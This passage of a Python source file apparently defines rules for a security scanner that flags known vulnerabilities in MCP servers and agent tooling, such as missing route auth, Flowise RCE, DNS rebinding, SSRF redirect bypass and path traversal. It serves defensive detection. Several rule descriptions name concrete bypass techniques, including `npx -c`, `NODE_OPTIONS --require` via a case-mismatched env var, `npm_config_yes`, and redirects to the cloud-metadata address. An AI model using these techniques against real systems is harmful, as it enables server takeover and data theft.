# AuthRequired. That's the bug nginx-ui 2.3.4 patched.
#
# References:
#   NVD    https://nvd.nist.gov/vuln/detail/CVE-2026-33032
#   Rapid7 https://www.rapid7.com/blog/post/etr-cve-2026-33032-nginx-ui-missing-mcp-authentication/
#   Picus  https://www.picussecurity.com/resource/blog/cve-2026-33032-mcpwn-how-a-missing-middleware-call-in-nginx-ui-hands-attackers-full-web-server-takeover
#   PoC    https://github.com/Twinson333/cve-2026-33032-scanner
# ---------------------------------------------------------------------------

_r(
    "AAK-MCPWN-001",
    "MCP route twin-asymmetry: auth middleware missing on sibling route (MCPwn, CVE-2026-33032)",
    "Two routes matching the MCP endpoint pattern (`/mcp`, `/mcp_message`, "
    "`/mcp/messages`, `/mcp[_-]invoke`, `/mcp[_-]tool`, ...) are declared "
    "in the same file, but one has no auth middleware while its twin does. "
    "This is the exact CVE-2026-33032 shape nginx-ui 2.3.4 patched and "
    "which VulnCheck KEV-listed on 2026-04-13 as actively exploited "
    "(CVSS 9.8). ~2,689 Shodan instances were exposed at disclosure; any "
    "network-adjacent caller can invoke the protected tools with zero "
    "credentials.",
    Severity.CRITICAL,
    Category.MCP_CONFIG,
    "Apply the same auth middleware to every MCP endpoint in a file. "
    "For Gin, use a `router.Use(AuthRequired())` group and mount all MCP "
    "routes inside it. For FastAPI, share a single `Depends(auth)` "
    "dependency across `@app.post('/mcp*')` decorators. For Express, "
    "create an `mcpRouter.use(authMw)` and mount it once.",
    sarif_name="McpwnTwinAsymmetry",
    cve_references=["CVE-2026-33032", "CVE-2026-27944"],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-AUTH-01"],
    incident_references=["MCPWN-2026-04-16"],
    limitations=(
        "Compares MCP routes inside one file: it fires on an unauthenticated route "
        "(`/mcp`, `/mcp_message`, `/mcp-messages`, `/mcp/invoke` and a few more) only "
        "when another MCP route in the same file has an auth marker from a fixed list. "
        "Twin routes placed in two modules are not paired, a path such as `/mcp/sse` "
        "is not recognised as an MCP route, an auth dependency that is not on the list "
        "(`Depends(verify_api_key)`) does not count as auth, and a FastAPI route "
        "written with single quotes (`@router.post('/mcp')`) is not read."
    ),
)


# ---------------------------------------------------------------------------
# Flowise MCP-adapter RCE (CVE-2026-40933 / GHSA-c9gw-hvqq-f33r)
#
# Authenticated RCE — npx with `-c` flag bypasses the allowlist. CVSS 10.0.
# Fixed in flowise 3.1.0 (verified via GHSA on 2026-04-20).
# Family: inherits from the Ox STDIO class already covered by
# AAK-STDIO-001; this is the Flowise-specific pin + flow-config check.
# ---------------------------------------------------------------------------

_r(
    "AAK-FLOWISE-001",
    "Flowise < 3.1.2 MCP adapter authenticated RCE",
    "Package manifest depends on `flowise` or `flowise-components` at "
    "version < 3.1.2, and/or a Flowise flow config (`.flowise/*.json`, "
    "`flows/*.json`) declares an MCP adapter node with `customFunction` "
    "or `runCode` sinks. The Custom-MCP feature is a recurring RCE class: "
    "CVE-2026-40933 (GHSA-c9gw-hvqq-f33r, CVSS 10.0) lets an authenticated "
    "attacker combine allowlisted commands like `npx` with execution flags "
    "such as `-c` for arbitrary OS command execution; CVE-2025-71336 "
    "(< 3.0.6, CVSS 9.8) is an unsandboxed RCE in the same feature; "
    "CVE-2026-56274 (< 3.1.2, CVSS 9.9) adds OS command injection via "
    "incomplete command-flag validation plus a regex bypass in local "
    "file-access restrictions; CVE-2026-58057 (< 3.1.3, CVSS 5.0) validates "
    "Custom-MCP stdio env vars against a *case-sensitive* denylist, so on "
    "Windows (case-insensitive env names) `node_options` slips past the "
    "NODE_OPTIONS entry and reaches `NODE_OPTIONS --require` code execution. "
    "CVE-2026-69263 (< 3.1.3, CVSS 8.7) is the same denylist-bypass class one "
    "step on: the denylist matched exact env-var names, but `npm_config_yes=true` "
    "reproduces `npx --yes` auto-install-and-execute without using a blocked flag; "
    "CVE-2026-69257 (< 3.1.3, CVSS 7.6) is a separate SSRF where `httpSecurity.ts` "
    "did not normalise IPv4-mapped IPv6 (`::ffff:127.0.0.1`), letting the MCP tool "
    "path reach loopback / cloud-metadata endpoints. "
    "Pin floor is 3.1.3 (highest fixed version) so 3.0.6–3.1.2 are still "
    "flagged. Same architectural class as Ox's original STDIO disclosure "
    "(see AAK-STDIO-001).",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade flowise and flowise-components to 3.1.3 or later. Audit "
    "every MCP adapter node in your flow configs; remove "
    "`customFunction`/`runCode` sinks unless they're validated against "
    "a strict argv allowlist, and treat env-var denylists as "
    "case-insensitive. See also AAK-STDIO-001 for the "
    "architectural-class detector.",
    sarif_name="FlowiseMcpAdapterRce",
    cve_references=[
        "CVE-2026-40933", "CVE-2025-71336", "CVE-2026-56274", "CVE-2026-58057",
        "CVE-2026-69263", "CVE-2026-69257",
        # CVE-2026-73601: Custom MCP node with CUSTOM_MCP_PROTOCOL=stdio lets an
        # authenticated user reach OS commands by way of PYTHONWARNINGS/BROWSER
        # with python3, or the root working directory with node. Same 3.1.3 fix
        # floor this rule already enforces, so it needs no separate detector.
        "CVE-2026-73601",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI04", "ASI05"],
    adversa_references=["ADV-RCE-04"],
    auto_fixable=True,
    limitations=(
        "The version arm reads `flowise` and `flowise-components` under "
        "`dependencies`, `devDependencies` and `peerDependencies` of the root "
        "package.json only, and reports a range that admits a version below 3.1.3, "
        "or a spec that states no version. package-lock.json, yarn.lock, "
        "pnpm-lock.yaml, `optionalDependencies`, `overrides`, a sub-directory "
        "package.json, an `npx flowise` launcher in .mcp.json and a "
        "`flowiseai/flowise` image tag in a compose file are not read. The flow arm "
        "reads `.flowise/*.json`, `flows/*.json` and `flows/**/*.json` that mention "
        "MCP and carry a `customFunction`, `runCode` or `executeCommand` key, so an "
        "export saved as `chatflows/export.json` is not reported."
    ),
)


# ---------------------------------------------------------------------------
# Third-party OAuth-app risk surface (VERCEL-2026-04-19 class)
# ---------------------------------------------------------------------------

_r(
    "AAK-OAUTH-SCOPE-001",
    "Third-party OAuth client granted broad Workspace scopes",
    "A config file in this repo grants a non-first-party Google OAuth "
    "client broad Workspace scopes (admin.*, cloud-platform, drive, "
    "directory.*, gmail.modify/send). The April 19 2026 Vercel × "
    "Context.ai breach is the template: a single compromised third-"
    "party OAuth app with deployment-level scopes let attackers pivot "
    "into production. Explicitly allowlist trusted client IDs in "
    "`.aak-oauth-trust.yml`.",
    Severity.HIGH,
    Category.TRUST_BOUNDARY,
    "Review the granted scopes — drop admin.* / cloud-platform where "
    "possible. Add every legitimate third-party client_id to "
    "`.aak-oauth-trust.yml` under `trusted_client_ids:`. Rotate the "
    "consent if the client isn't recognised.",
    sarif_name="ThirdPartyOAuthBroadScope",
    owasp_agentic_references=["ASI03", "ASI04"],
    incident_references=["VERCEL-2026-04-19"],
    limitations=(
        "Reads a fixed set of paths under the project root (`app.yaml`, `vercel.json`, "
        "`netlify.toml`, `oauth.json`, `oauth_client.json`, `client_secret*.json`, "
        "`.well-known/oauth-client-credentials.json` and "
        "`.google-cloud-sdk/**/*.json`) for Google scopes under admin.*, "
        "cloud-platform, drive, gmail.modify, gmail.send and directory.*. Scopes "
        "written in source code (`SCOPES = [...]` in a `.py` file) and "
        "`https://mail.google.com/` are not matched."
    ),
)

_r(
    "AAK-OAUTH-3P-001",
    "Repo depends on a third-party agent-platform SDK",
    "The project depends on an agent-platform SDK (context-ai, "
    "langsmith, helicone, langfuse, humanloop, MCP SDK). Informational "
    "finding so reviewers audit the vendor's OAuth-scope footprint "
    "before merging. Raised to MEDIUM because the April 19 2026 "
    "Vercel × Context.ai incident showed a single vendor compromise "
    "can turn into a production breach via transitive OAuth grants.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Pin the SDK to an exact version, audit the OAuth scopes it "
    "requests, and keep any deployment-level grants (Vercel, GCP, "
    "Workspace) in a secrets vault — never in a committed env file. "
    "See Vercel's bulletin for sensitive-env-var guidance: "
    "https://vercel.com/kb/bulletin/vercel-april-2026-security-incident",
    sarif_name="ThirdPartyAgentPlatformSdk",
    owasp_agentic_references=["ASI04"],
    incident_references=["VERCEL-2026-04-19"],
    limitations=(
        "Reads the dependency names of the root package.json (`dependencies`, "
        "`devDependencies`, `peerDependencies`), the `[project].dependencies` of "
        "the root pyproject.toml and the root requirements*.txt, and matches each "
        "name exactly against a fixed list (context-ai, langsmith, helicone, "
        "langfuse, humanloop, `@langchain/langsmith`, `@modelcontextprotocol/sdk` "
        "and the Python mcp, langsmith-py and helicone-py). A requirement with "
        "extras (`mcp[cli]>=1.2.0`), another capitalisation (`Langfuse`), "
        "`[project.optional-dependencies]` or Poetry tables, a lockfile and a "
        "sub-directory manifest are not reported."
    ),
)


# ---------------------------------------------------------------------------
# mcp-framework HTTP-body DoS (CVE-2026-39313 / GHSA: mcp-framework < 0.2.22).
# readRequestBody concatenates request body chunks into a single string with
# no cap — maxMessageSize is never consulted — so a single large POST to
# /mcp exhausts memory.
# ---------------------------------------------------------------------------

_r(
    "AAK-MCPFRAME-001",
    "mcp-framework < 0.2.22 HTTP-body DoS",
    "Project depends on `mcp-framework` at a version < 0.2.22, or a TS/JS "
    "file implements an MCP HTTP transport that concatenates request "
    "body chunks into a string without consulting Content-Length or a "
    "`maxMessageSize` guard. CVE-2026-39313 lets an unauthenticated "
    "attacker crash the server with a single large POST to /mcp by "
    "exhausting process memory. Fixed in 0.2.22.",
    Severity.MEDIUM,
    Category.TRANSPORT_SECURITY,
    "Upgrade `mcp-framework` to 0.2.22 or newer. For custom transports, "
    "enforce a hard body-size cap before accumulating chunks — reject "
    "early when `Content-Length` exceeds your `maxMessageSize`.",
    sarif_name="McpFrameworkHttpBodyDos",
    cve_references=["CVE-2026-39313"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-DOS-01"],
    aicm_references=["LOG-13"],
    limitations=(
        "Fires on a TypeScript or JavaScript file that reads a request body with "
        "`req.on('data', ...)`, `for await (... of req)` or a function called "
        "`readRequestBody` and appends chunks to a variable named body, data, buf or "
        "chunks, with `+=` in a statement that ends with a semicolon or with "
        "`.push(chunk)`, and has no size check. A comparison with `<`, `>`, `<=` or "
        "`>=` of total, length or size against a number literal anywhere in the file, "
        "such as `parts.length > 0`, counts as a size check; an accumulator under "
        "another name (`raw += chunk`) and a `+=` statement without its semicolon "
        "(`body += chunk.toString() }`) are not matched."
    ),
)


# ---------------------------------------------------------------------------
# Apache Doris MCP Server SQL injection (CVE-2025-66335, Doris MCP < 0.6.1).
# Published 2026-04-20. Query-context neutralization bypass in the adapter's
# tool layer lets crafted tool calls inject SQL.
# ---------------------------------------------------------------------------

_r(
    "AAK-DORIS-001",
    "apache-doris-mcp-server < 0.6.1 SQL injection",
    "Project depends on `apache-doris-mcp-server` at a version < 0.6.1. "
    "CVE-2025-66335 is a query-context neutralization bypass in the MCP "
    "adapter's tool layer — crafted tool arguments are concatenated into "
    "Doris SQL without a parameterized boundary, letting an LLM-driven "
    "tool call reach into arbitrary reads/writes. CVE-2025-66336 is a "
    "sibling SQL injection in a metadata query path (a user-controlled "
    "database name interpolated without the caller's authz context), same "
    "< 0.6.1 fixed line. Fixed in 0.6.1.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Upgrade `apache-doris-mcp-server` to 0.6.1 or newer. Audit every "
    "tool the adapter exposes to confirm arguments flow through a "
    "parameterized query builder, never string concatenation.",
    sarif_name="DorisMcpSqlInjection",
    cve_references=["CVE-2025-66335", "CVE-2025-66336"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-INJECT-02"],
    aicm_references=["AIS-07", "DSP-07"],
    limitations=(
        "Matches `apache-doris-mcp-server` followed directly by a version "
        "(`apache-doris-mcp-server==0.5.0`) in requirements*.txt at the project "
        "root and in a dependency string of the root pyproject.toml. A name with no "
        "version, a git URL, the table form that Poetry and Pipfile use "
        "(`apache-doris-mcp-server = \"^0.5.0\"`), a requirements file in a "
        "sub-directory and an `.mcp.json` launcher are not reported. Pipfile.lock, "
        "poetry.lock and uv.lock are opened but never match, because the name and "
        "the version sit on separate lines, so a version that reaches the project "
        "only through a lockfile is not reported."
    ),
)


# ---------------------------------------------------------------------------
# SDK-level STDIO sanitization inheritance (OX-MCP-2026-04-15 incident class).
# Anthropic declined to CVE this — OX Security's "Mother of all AI supply
# chains" disclosure confirms the STDIO interface in the upstream MCP SDKs
# passes configuration to the OS as command execution by design. Downstream
# servers must add their own sanitizer.
# ---------------------------------------------------------------------------

_r(
    "AAK-ANTHROPIC-SDK-001",
    "MCP server built on the upstream SDK without STDIO sanitizer",
    "Repository declares a dependency on the upstream Anthropic / "
    "ModelContextProtocol SDK (Python `mcp` / `modelcontextprotocol`, "
    "TS `@modelcontextprotocol/sdk`, Java `io.modelcontextprotocol:*`, "
    "Rust `mcp` / `modelcontextprotocol`) and exposes a STDIO transport "
    "(`StdioServerTransport`, `stdio_server`, etc.) without a sanitizer "
    "on argv assembly. Anthropic declined to CVE this as working as "
    "designed — sanitization is the developer's responsibility. The OX "
    "Security disclosure on 2026-04-15 rolled up LiteLLM, LangChain and "
    "IBM LangFlow as downstream casualties of exactly this pattern. "
    "See also AAK-STDIO-001 for the sink-level detector.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Wrap every argv the STDIO transport builds in an allow-list "
    "sanitizer — `shlex.quote` in Python, `execFile` with an explicit "
    "argv array in Node, equivalent in Java/Rust. OR switch the "
    "transport off STDIO (`transports=['http']` / `['sse']`). If you "
    "have deliberately accepted the risk, add "
    "`accepts_stdio_risk: true` plus a `justification:` field in "
    "`.agent-audit-kit.yml`.",
    sarif_name="AnthropicSdkStdioSanitizer",
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI05"],
    adversa_references=["ADV-INJECT-01"],
    incident_references=["OX-MCP-2026-04-15"],
    aicm_references=["AIS-07", "STA-08"],
    limitations=(
        "Recognises a sanitizer or opt-out by name in any file that uses a STDIO "
        "transport: a `shlex.quote(` or `shlex.split(` call, an `ALLOWED_*`, "
        "`WHITELIST_*` or `VALID_TOOLS` constant, or an HTTP-only transport "
        "setting. One such file clears every STDIO file in the project, whatever "
        "the name guards: an `ALLOWED_ORIGINS` list in `src/cors.ts` silences an "
        "unguarded `StdioServerTransport` in `src/server.ts`."
    ),
)


# ---------------------------------------------------------------------------
# DNS-rebinding SDK class (CVE-2025-66414 / 66416, CVE-2026-35568, 2026-35577).
# April 2026 cluster: upstream MCP Python, Java, Apollo, TS SDKs shipped a
# StreamableHTTP transport that trusted the browser-supplied Host header,
# letting a malicious web page reach a loopback MCP server via DNS rebinding.
# ---------------------------------------------------------------------------

_r(
    "AAK-DNS-REBIND-001",
    "MCP StreamableHTTP transport without Host-header allow-list",
    "The upstream MCP Python, Java, Apollo and TypeScript SDKs shipped a "
    "StreamableHTTP transport that trusts the browser-supplied `Host` "
    "header. A malicious web page that a user visits can resolve a "
    "custom domain to 127.0.0.1 via DNS rebinding and reach a local MCP "
    "server, turning every browser tab into a remote-attack surface for "
    "stdio-grade tools. The upstream patch adds a Host allow-list; "
    "downstream servers embedding StreamableHTTP must enforce one too. "
    "See CVE-2025-66414 / CVE-2025-66416 (Python), CVE-2026-35568 (Java), "
    "CVE-2026-35577 (Apollo), CVE-2026-81102 (Python FastMCP), and "
    "CVE-2026-77363, a downstream server (obsidian-tc before 1.3.1) whose "
    "TypeScript transport checked neither Host nor Origin. "
    "Detection reads the raw SDK transport classes and, since v0.3.93, the "
    "Python **FastMCP** wrapper when it is told to run over a network "
    "transport (`run(transport=\"streamable-http\"/\"sse\")`, "
    "`streamable_http_app()`, `sse_app()`). **stdio FastMCP servers are "
    "deliberately not flagged**: FastMCP defaults to stdio and a stdio server "
    "has no listener to rebind onto. **Binding to loopback is not a "
    "mitigation** and does not clear this rule -- CVE-2026-81102 was loopback-"
    "bound; the Host allow-list is the control. Single-file pattern detection "
    "with a project-wide mitigation check: one allow-list anywhere in the tree "
    "clears every candidate, so a server whose middleware lives in a separate "
    "package that is not scanned together will read as mitigated.",
    Severity.CRITICAL,
    Category.TRANSPORT_SECURITY,
    "Wrap the StreamableHTTP app with a Host-header allow-list. In "
    "Starlette / FastAPI attach `TrustedHostMiddleware(allowed_hosts=...)`; "
    "in Node attach an `allowedHosts:` option or a Host middleware; in "
    "Java/Apollo enable `HostHeaderFilter` / `allowedHosts` config. "
    "In Python FastMCP pass "
    "`transport_security=TransportSecuritySettings(allowed_hosts=[...])` "
    "when constructing the server, or run it over stdio. "
    "Alternatively upgrade the SDK to a patched version and pass through "
    "its host-validation option.",
    sarif_name="McpStreamableHttpDnsRebind",
    cve_references=[
        "CVE-2025-66414",
        "CVE-2025-66416",
        "CVE-2026-35568",
        "CVE-2026-35577",
        "CVE-2026-81102",
        # 2026-10-15 batch (#984). obsidian-tc's transport before 1.3.1 builds the
        # SDK's StreamableHTTP transport with no Host or Origin check. The rule fires
        # on that shape and clears on 1.3.1's, which threads `allowedHosts` through
        # the CLI and the config schema (fixtures: cve-2026-77363-obsidian-tc-rebind).
        "CVE-2026-77363",
    ],
    owasp_mcp_references=["MCP07:2025"],
    owasp_agentic_references=["ASI07"],
    adversa_references=["ADV-NETWORK-01"],
    incident_references=["MCP-DNS-REBIND-2026-04"],
    limitations=(
        "A candidate is a .py, .ts, .tsx, .js, .mjs or .cjs file that builds a "
        "StreamableHTTP transport, or a Python FastMCP server run over a network "
        "transport. One Host allow-list anywhere in the project clears every "
        "candidate, whatever it protects: a Django `ALLOWED_HOSTS` in an unrelated app "
        "counts."
    ),
)

_r(
    "AAK-DNS-REBIND-002",
    "Vulnerable MCP SDK version pinned (DNS-rebinding fix missing)",
    "A project dependency manifest (requirements.txt, pyproject.toml, "
    "package.json, pom.xml, build.gradle) pins an MCP SDK at a version "
    "below the DNS-rebinding fix. Patched versions: Python `mcp` >= "
    "1.23.0, TS `@modelcontextprotocol/sdk` >= 1.21.1, Java "
    "`io.modelcontextprotocol.sdk:mcp-core` >= 0.11.0, `@apollo/mcp-server` "
    ">= 1.7.0. Even if the project never serves over StreamableHTTP "
    "itself, transitive servers built on the SDK inherit the bug.",
    Severity.HIGH,
    Category.SUPPLY_CHAIN,
    "Bump the SDK to the patched version listed in the rule title. If a "
    "bump is not yet possible, ensure every transport surface has its own "
    "Host-header allow-list (see AAK-DNS-REBIND-001 remediation).",
    sarif_name="McpSdkDnsRebindPin",
    cve_references=[
        "CVE-2025-66414",
        "CVE-2025-66416",
        "CVE-2026-35568",
        "CVE-2026-35577",
    ],
    owasp_mcp_references=["MCP04:2025", "MCP07:2025"],
    owasp_agentic_references=["ASI04", "ASI07"],
    adversa_references=["ADV-SUPPLY-01"],
    incident_references=["MCP-DNS-REBIND-2026-04"],
    limitations=(
        "Reads `mcp` below 1.23.0 in the root requirements*.txt (pinned with `==`, "
        "`<` or `<=`) and pyproject.toml, `@modelcontextprotocol/sdk` below 1.21.1 "
        "and `@apollo/mcp-server` below 1.7.0 in the root package.json, and "
        "`io.modelcontextprotocol.sdk:mcp-core` below 0.11.0 in the root pom.xml "
        "and Gradle files. A name with extras (`mcp[cli]==1.22.0`), the Poetry "
        "table form (`mcp = \"1.22.0\"`), a lockfile (uv.lock, package-lock.json) and "
        "a requirements file in a sub-directory are not read."
    ),
)


# ---------------------------------------------------------------------------
# Splunk MCP Server token-cleartext logging (CVE-2026-20205, splunk-mcp-server
# < 1.0.3). The server logged session tokens into the _internal index without
# redaction, exposing them to anyone with read access.
# ---------------------------------------------------------------------------

_r(
    "AAK-SPLUNK-TOKLOG-001",
    "Session token written to log sink in cleartext",
    "An MCP server, agent, or tool logs a session token, JWT, or Bearer "
    "credential through a generic log sink (logger.info / .warn / .error, "
    "print) without redaction. CVE-2026-20205 (splunk-mcp-server < 1.0.3) "
    "shipped this exact pattern — session tokens ended up in the Splunk "
    "`_internal` index, readable by anyone with index-read. Any token "
    "written to a log sink is also a supply-chain risk: the log file, "
    "shipper, and SIEM are now in scope for the token's blast radius.",
    Severity.HIGH,
    Category.SECRET_EXPOSURE,
    "Redact token-shaped values before logging. Never interpolate a raw "
    "`Authorization`, `Bearer`, JWT, `splunkd_session`, or `st-` credential "
    "into a log message. Pin `splunk-mcp-server >= 1.0.3`.",
    sarif_name="SplunkMcpTokenLog",
    cve_references=["CVE-2026-20205"],
    owasp_mcp_references=["MCP01:2025"],
    owasp_agentic_references=["ASI03"],
    adversa_references=["ADV-LEAK-01"],
    incident_references=["SVD-2026-0405"],
    limitations=(
        "The log-call check reads calls on a receiver named `logger`, `logging`, "
        "`LOGGER` or `log` (and `print`, `console.*` and `System.out`) whose arguments "
        "carry a token-shaped literal or a variable named like `access_token`, "
        "`session_token`, `api_key` or `bearer`. A logger held under any other name is "
        "not recognised: the same call on `_logger`, `self._logger` or `LOG` is not "
        "reported."
    ),
)


# ---------------------------------------------------------------------------
# GitHub Actions Immutable Action / SHA-pin (April 2026 Security Roadmap).
# Third-party Actions pinned by tag or branch are mutable — a supply-chain
# takeover of the Action's repo can re-tag a malicious revision under the
# same ref. GitHub's 2026 roadmap makes SHA pinning the default policy.
# ---------------------------------------------------------------------------

_r(
    "AAK-GHA-IMMUTABLE-001",
    "Third-party GitHub Action not pinned by full commit SHA",
    "A workflow in `.github/workflows/` uses a third-party Action "
    "(`owner/action@ref`) where `ref` is a tag or branch name instead of "
    "a 40-character commit SHA. A repo-takeover of the Action's publisher "
    "can re-point the tag to a malicious revision — the downstream repo "
    "consuming it will happily run the new code with `GITHUB_TOKEN` and "
    "write permissions. GitHub's April 2026 Security Roadmap ships "
    "Immutable Actions and makes SHA pinning the default policy.",
    Severity.MEDIUM,
    Category.SUPPLY_CHAIN,
    "Repin third-party Actions to a 40-character commit SHA and add a "
    "`# v1.2.3`-style trailing comment for humans. First-party Actions "
    "under `actions/` and `github/` are exempt (they now ship Immutable "
    "Actions). Dependabot will auto-bump SHA pins when `update-type: "
    "all` is set.",
    sarif_name="GhaNonShaPin",
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-SUPPLY-02"],
    incident_references=["GHA-IMMUTABLE-2026-04"],
    limitations=(
        "Reads the `uses:` entries of the files directly inside `.github/workflows` "
        "and reports an `owner/action@ref` whose ref is not a 40-character commit "
        "SHA, except for the owners `actions` and `github`, local `./` actions and "
        "`docker://` images. A third-party action referenced from a local composite "
        "action (`.github/actions/setup/action.yml`) is not read, and neither is an "
        "`actions/` or `github/` action pinned to a branch "
        "(`actions/checkout@main`) or a `docker://` image tag."
    ),
)


# ---------------------------------------------------------------------------
# excel-mcp-server path traversal (CVE-2026-40576, excel-mcp-server <= 0.1.7).
# Documented SSE / Streamable-HTTP transport with 0.0.0.0 bind and no
# filepath validation in get_excel_path().
# ---------------------------------------------------------------------------

_r(
    "AAK-EXCEL-MCP-001",
    "excel-mcp-server <= 0.1.7 path traversal",
    "Project depends on `excel-mcp-server` at a version <= 0.1.7. "
    "CVE-2026-40576 is a path-traversal in the server's `get_excel_path()` "
    "helper — absolute paths pass through unchecked, relative paths are "
    "joined without resolving-and-validating the result. Combined with the "
    "default 0.0.0.0 bind + zero authentication on SSE / Streamable-HTTP, "
    "any unauthenticated network peer can read, write or overwrite files "
    "anywhere on the host. Fixed in 0.1.8.",
    Severity.CRITICAL,
    Category.SUPPLY_CHAIN,
    "Upgrade `excel-mcp-server` to 0.1.8 or later. Until the bump is in, "
    "bind the server to 127.0.0.1 and front it with an auth proxy.",
    sarif_name="ExcelMcpPathTraversal",
    cve_references=["CVE-2026-40576"],
    owasp_mcp_references=["MCP04:2025", "MCP05:2025"],
    owasp_agentic_references=["ASI02", "ASI04"],
    adversa_references=["ADV-INJECT-03"],
    limitations=(
        "Matches `excel-mcp-server` followed directly by a version "
        "(`excel-mcp-server==0.1.7`) in requirements*.txt at the project root and "
        "in a dependency string of the root pyproject.toml. A name with no version, "
        "a git URL, the table form that Poetry and Pipfile use (`excel-mcp-server = "
        "\"^0.1.7\"`), a requirements file in a sub-directory and an `.mcp.json` "
        "launcher are not reported. Pipfile.lock, poetry.lock and uv.lock are "
        "opened but never match, because the name and the version sit on separate "
        "lines, so a version that reaches the project only through a lockfile is "
        "not reported."
    ),
)


# ---------------------------------------------------------------------------
# Next AI Draw.io body-accumulation DoS (CVE-2026-40608, next-ai-draw-io
# < 0.4.15). Same class as AAK-MCPFRAME-001 — unbounded body accumulation
# in the sidecar HTTP handlers.
# ---------------------------------------------------------------------------

_r(
    "AAK-NEXT-AI-DRAW-001",
    "next-ai-draw-io < 0.4.15 body-accumulation DoS",
    "Project depends on `next-ai-draw-io` at a version below 0.4.15. "
    "CVE-2026-40608 is a body-accumulation OOM in the embedded HTTP "
    "sidecar's /api/state, /api/restore and /api/history-svg handlers — "
    "the entire request body is concatenated into a JavaScript string "
    "without a size cap, so a single ~500 MiB POST exhausts V8 heap and "
    "crashes the MCP server. Same DoS class as AAK-MCPFRAME-001. "
    "Fixed in 0.4.15.",
    Severity.MEDIUM,
    Category.TRANSPORT_SECURITY,
    "Upgrade `next-ai-draw-io` to 0.4.15 or later. For custom transports "
    "that replicate the pattern, enforce a hard body-size cap before "
    "accumulating chunks and reject early when `Content-Length` exceeds "
    "the cap.",
    sarif_name="NextAiDrawBodyDos",
    cve_references=["CVE-2026-40608"],
    owasp_mcp_references=["MCP04:2025"],
    owasp_agentic_references=["ASI04"],
    adversa_references=["ADV-DOS-02"],
    limitations=(
        "Reads the dependencies, devDependencies and peerDependencies of the "
        "`package.json` at the root of the scanned directory. The same dependency "
        "declared in a workspace package's own `package.json` "
        "(`apps/web/package.json`) is not read."
    ),
)


# ---------------------------------------------------------------------------
# LangChain SSRF redirect bypass (CVE-2026-41481, langchain-text-splitters
# < 1.1.2). HTMLHeaderTextSplitter.split_text_from_url() validates the
# initial URL via validate_safe_url() and then fetches with redirects on
# by default — so a 302 from an attacker-controlled host into the cloud
# metadata endpoint reaches the parsed Document.
# ---------------------------------------------------------------------------

_r(
    "AAK-LANGCHAIN-SSRF-REDIR-001",
    "Validate-then-fetch SSRF (redirects enabled past allow-list)",
    "A function calls a known SSRF guard helper "
    "(`validate_safe_url`, `is_safe_url`, `validateSafeUrl`, etc.) and "
    "then fetches the same URL via `requests.get`, `httpx.get`, "
    "`urllib.request.urlopen`, `fetch`, or similar without disabling "
    "redirects. The allow-list fires once on the initial URL, but "
    "`requests` follows 3xx by default — a redirect into "
    "`http://169.254.169.254/...`, `http://localhost`, or another "
    "blocked target bypasses the guard and pulls the response back into "
    "the calling context. CVE-2026-41481 is the in-tree example "
    "(langchain-text-splitters < 1.1.2). Same shape applies in any "
    "agent-tooling code that does validate→fetch without "
    "`allow_redirects=False` / `follow_redirects=False` / "
    "`redirect: 'manual'`.",
    Severity.HIGH,
    Category.TRANSPORT_SECURITY,
    "Disable redirect following on the fetch call: "
    "`requests.get(url, allow_redirects=False)`, "
    "`httpx.get(url, follow_redirects=False)`, "
    "`fetch(url, { redirect: 'manual' })`. Or revalidate the URL on "
    "every redirect hop. For `langchain-text-splitters`, bump to "
    ">= 1.1.2.",
    sarif_name="LangchainSsrfRedirect",
    cve_references=["CVE-2026-41481"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
    adversa_references=["ADV-NETWORK-02"],
    incident_references=["GHSA-fv5p-p927-qmxr"],
    limitations=(
        "In Python it looks inside one function for a call to one of seven guard names "
        "(`validate_safe_url`, `validate_url`, `is_safe_url`, `ensure_safe_url`, "
        "`check_safe_url`, `ssrf_guard`, `is_url_safe`) followed by a fetch (`get`, "
        "`post`, `put`, `delete`, `request`, `urlopen`, `fetch` or `send`) that does "
        "not disable redirects. A guard under another name (`assert_public_url`), or a "
        "guard and a fetch in two separate, non-nested Python functions, is not "
        "matched."
    ),
)


# ---------------------------------------------------------------------------
# TOCTOU / DNS-rebind in URL allow-list (CVE-2026-41488, langchain-openai
# < 1.1.14). _url_to_size() validates a URL, then re-resolves DNS in a
# separate fetch — leaving a window for a hostname to rotate from a
# public IP to a private one between the two operations.
# ---------------------------------------------------------------------------

_r(
    "AAK-SSRF-TOCTOU-001",
    "Validate-then-fetch DNS-rebind / TOCTOU on URL allow-list",
    "A function validates a URL via an SSRF guard, then performs a "
    "separate network fetch that triggers an independent DNS "
    "resolution. Between the two resolutions a malicious hostname can "
    "rotate from a public IP to a private/localhost/cloud-metadata IP "
    "(DNS rebinding) — bypassing the allow-list. CVE-2026-41488 "
    "(langchain-openai `_url_to_size`) is the canonical example; "
    "CVE-2026-53708 (`mcp-contextforge-gateway` < 1.0.3, "
    "`/admin/gateways/test`) is the same bug reached through a guard "
    "named after the endpoint rather than after the check, and "
    "CVE-2026-55096 (`fast-mcp-telegram` < 0.30.1) through a "
    "module-private guard, `_validate_url_security`, that checks the "
    "literal hostname and never resolves it at all. The "
    "fix is to resolve once, pin the IP, and reuse the same `Session` / "
    "`HTTPAdapter` for the fetch — or drive the allow-list check on the "
    "resolved IP instead of the hostname.",
    Severity.MEDIUM,
    Category.TRANSPORT_SECURITY,
    "Resolve the hostname once with `socket.getaddrinfo`, validate the "
    "resolved IP against the allow-list, then make the fetch over a "
    "`Session` / connection pinned to that IP (e.g. via `Host:` header "
    "+ explicit IP, custom `HTTPAdapter`, or `pinned_ip`-style helper). "
    "Pin `langchain-openai >= 1.1.14`.",
    sarif_name="UrlAllowListToctou",
    cve_references=["CVE-2026-41488", "CVE-2026-53708", "CVE-2026-55096"],
    owasp_mcp_references=["MCP05:2025"],
    owasp_agentic_references=["ASI02"],
